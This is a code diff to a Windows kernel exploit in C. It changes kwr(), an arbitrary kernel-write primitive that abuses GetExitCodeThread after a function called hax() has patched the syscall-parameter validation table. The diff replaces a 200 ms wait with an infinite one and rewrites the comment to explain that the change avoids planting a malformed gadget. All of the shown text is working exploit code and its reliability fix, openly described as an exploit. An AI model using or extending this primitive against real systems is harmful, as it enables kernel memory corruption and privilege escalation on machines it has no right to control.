@@ -6,20 +6,15 @@ DWORD WINAPI thread_exit_with_value(void* x) {
 	              can't prove it, so this satisfies C4716 (must return a value). */
 }
 
-// Write `val` to `kptr`.
-//
-// The exploit: thread runs ExitThread((DWORD)val) immediately on entry.
-// GetExitCodeThread(t, kernel_ptr), with the syscall-param validation
-// table pre-patched by hax(), writes the exit code to whatever pointer
-// is passed, including kernel addresses.
-//
-// WaitForSingleObject(t, 200) bounds the wait at 200ms worst case but
-// returns as soon as the thread exits (typically <10ms for the trivial
-// ExitThread body). The thread handle is closed after each write.
+// Write `val` to `kptr` via the exit-code primitive: GetExitCodeThread(t, ptr), with the
+// syscall-param validation table pre-patched by hax(), stores t's exit code to any pointer,
+// including a kernel address. The wait must block until the thread has actually exited: for
+// a running thread GetExitCodeThread returns STILL_ACTIVE (0x103), not `val`, which would
+// plant a malformed gadget. The body is ExitThread, so it always completes.
 void kwr(DWORD kptr, DWORD val) {
 	HANDLE t = CreateThread(NULL, 0, thread_exit_with_value, (void*)val, 0, NULL);
 	if (t != NULL) {
-		WaitForSingleObject(t, 200);
+		WaitForSingleObject(t, INFINITE);
 		GetExitCodeThread(t, (DWORD*)kptr);
 		CloseHandle(t);
 	}
